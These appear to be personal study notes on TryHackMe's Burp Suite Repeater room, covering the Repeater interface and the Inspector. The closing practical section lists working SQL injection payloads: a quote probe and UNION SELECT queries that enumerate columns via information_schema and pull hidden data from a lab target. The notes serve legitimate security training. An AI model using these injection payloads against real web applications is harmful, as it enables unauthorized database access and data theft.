https://tryhackme.com/room/burpsuiterepeater

### Table of contents
- [[#Intro]]
- [[#Basic Usage]]
- [[#Inspector]]
- [[#Practical]]

___
### Intro
[[#Table of contents|Back to the top]]

[[04 Burp Suite Basics|Burp Suite Basics]]

Modify and resend intercepted (in Proxy) requests / or manually create requests from scratch

![[Pasted image 20251201144912.png]]
1. **Request List**: top left of tab, displays list of Repeater requests
2. **Request Controls**: directly beneath request list, send request, cancel hanging request, navigate through request history
3. **Request and Response View**: occupying majority of interface, displays **Request** and **Response** views, edit request in Request View, then forward it, while corresponding response will be shown in Response View
4. **Layout Options**: top-right of Request/Response View, customize layout of Request/Response View
5. **Inspector**: right-hand side, analyze and modify requests in more intuitive manner than using raw editor
6. **Target**: above Inspector, specifies IP address / domain to which requests are sent. Requests sent to Repeater from other Burp Suite components --> field automatically populated

___
### Basic Usage
[[#Table of contents|Back to the top]]

Right-click on request and Send to Repeater / **`CTRL + R`**

Request ends up in **Request View**

**Message Analysis Toolbar**
![[Pasted image 20251201150605.png]]
1. **Pretty** (default): takes raw response and applies slight formatting enhancements to improve readability
2. **Raw**: unmodified response directly received from server
3. **Hex**: byte-level representation (particularly useful when dealing with binary files)
4. **Render**: page as it would appear in web browser

___
### Inspector
[[#Table of contents|Back to the top]]

*Visually organized breakdown of requests and responses, experiment to see how changes made using higher-level Inspector affect equivalent raw versions*

![[Pasted image 20251201151122.png|300]]
These sections can be modified (addition, edition, removal of items)

1. **Request attributes:** location, method (POST, GET, ...), protocol (HTTP/1, HTTP/2, ...)
2. **Request query parameters:** data sent to server via URL
   Example: `https://example.thm/?parameter=value`
3. **Request body parameters:** similar to query parameters, specific to POST requests. Any data sent as part of a POST request will be displayed in this section
4. **Request cookies:** modifiable list of cookies sent with each request
5. **Request headers:** headers sent with requests. Editing headers can be valuable when examining how web server responds to unexpected headers
6. **Response headers:** This section displays the headers returned by the server in response to our request. It cannot be modified, as we have no control over the headers returned by the server. Note that this section becomes visible only after sending a request and receiving a response.

___
### Practical
[[#Table of contents|Back to the top]]

`http://10.82.159.228/about/2` --> modify 2 to create SQL query

1. `http://10.82.159.228/about/2'`: check for SQLi vulnerability
   Error message: `SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'`
2. `0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"`: modify 2 to 0 (invalid number) so we retrieve only content from after UNION
   1st column: `id`
3. `0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"`
   --> `About | id,firstName,lastName,pfpLink,role,shortRole,bio,notes None`
4. See what's in notes: `0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1`